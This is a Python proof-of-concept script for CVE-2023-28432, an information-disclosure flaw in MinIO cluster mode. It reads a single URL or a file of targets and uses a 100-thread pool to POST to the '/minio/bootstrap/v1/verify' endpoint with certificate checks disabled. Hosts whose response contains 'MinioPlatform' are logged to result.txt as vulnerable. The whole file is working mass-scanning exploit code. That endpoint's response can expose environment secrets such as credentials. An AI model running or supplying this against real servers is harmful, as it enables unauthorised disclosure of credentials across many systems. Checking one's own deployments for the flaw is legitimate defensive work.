import requests,sys,re,argparse,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """    __  ____       ______ 
   /  |/  (_)___  / / __ \
  / /|_/ / / __ \/ / / / /
 / /  / / / / / / / /_/ / 
/_/  /_/_/_/ /_/_/\____/  
                          """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='MinIO集群模式信息泄露漏洞复现 CVE-2023-28432')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/minio/bootstrap/v1/verify'
    headers = {
        'Accept-Encoding':'gzip, deflate',
        'Accept':'*/*',
        'Accept-Language':'en-US;q=0.9,en;q=0.8',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
        'Connection':'close',
        'Cache-Control':'max-age=0',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'0',
    }
    data = {}
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'MinioPlatform' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
            return True
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()